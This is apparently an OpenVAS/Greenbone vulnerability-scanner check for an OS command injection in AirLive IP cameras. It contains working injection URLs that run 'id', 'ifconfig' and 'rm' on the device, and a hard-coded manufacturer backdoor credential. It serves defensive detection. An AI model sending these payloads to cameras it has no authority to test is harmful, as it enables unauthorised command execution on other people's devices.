if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.105315" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-2279", "CVE-2014-8389" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "AirLive Multiple Products OS Command Injection" );
	script_xref( name: "URL", value: "http://www.coresecurity.com/advisories/airlive-multiple-products-os-command-injection" );
	script_tag( name: "vuldetect", value: "Try to execute the 'id/ifconfig' command via a HTTP GET request and check the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "There is an OS Command Injection in the cgi_test.cgi binary file in the AirLive MD-3025, BU-3026
  and BU-2015 cameras when handling certain parameters. That specific CGI file can be requested without authentication, unless the
  user specified in the configuration of the camera that every communication should be performed over HTTPS (not enabled by default)." );
	script_tag( name: "affected", value: "AirLive BU-2015 with firmware 1.03.18 16.06.2014,

  AirLive BU-3026 with firmware 1.43 21.08.2014,

  AirLive MD-3025 with firmware 1.81 21.08.2014,

  AirLive WL-2000CAM with firmware LM.1.6.18 14.10.2011,

  AirLive POE-200CAM v2 with firmware LM.1.6.17.01.

  Other devices may be affected too." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-07-07 14:11:14 +0200 (Tue, 07 Jul 2015)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "Boa/banner", "AirLive/banner" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Server: Boa" ) || ( !ContainsString( banner, "AirLive" ) && !IsMatchRegexp( banner, "(WL|MD|BU|POE)-" ) )){
	exit( 0 );
}
if(IsMatchRegexp( banner, "(MD|BU)-" )){
	url = "/cgi_test.cgi?write_tan&;id&id";
	if(buf = http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+" )){
		ret = egrep( string: buf, pattern: "uid=[0-9]+.*gid=[0-9]+" );
		report = "By requesting \"" + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\" it was possible to execute the \"id\" command. Response:\n\n[...] " + chomp( ret ) + " [...]";
		security_message( port: port, data: report );
		exit( 0 );
	}
}
if(IsMatchRegexp( banner, "(WL|POE)-" )){
	vt_strings = get_vt_strings();
	rand = vt_strings["lowercase_rand"];
	auth = base64( str: "manufacture:erutcafunam" );
	url = "/cgi-bin/mft/wireless_mft?ap=testname;/sbin/ifconfig%202>%261%20>%20/web/html/" + rand;
	req = http_get( item: url, port: port );
	req = ereg_replace( string: req, pattern: "\r\n\r\n", replace: "\r\nAuthorization: Basic " + auth + "\r\n\r\n" );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	url = "/" + rand;
	req = http_get( item: url, port: port );
	req = ereg_replace( string: req, pattern: "\r\n\r\n", replace: "\r\nAuthorization: Basic " + auth + "\r\n\r\n" );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( buf, "eth0" ) && ContainsString( buf, "Link encap" ) && ContainsString( buf, "HWaddr" )){
		url = "/cgi-bin/mft/wireless_mft?ap=testname;rm%20/web/html/" + rand;
		req = http_get( item: url, port: port );
		req = ereg_replace( string: req, pattern: "\r\n\r\n", replace: "\r\nAuthorization: Basic " + auth + "\r\n\r\n" );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

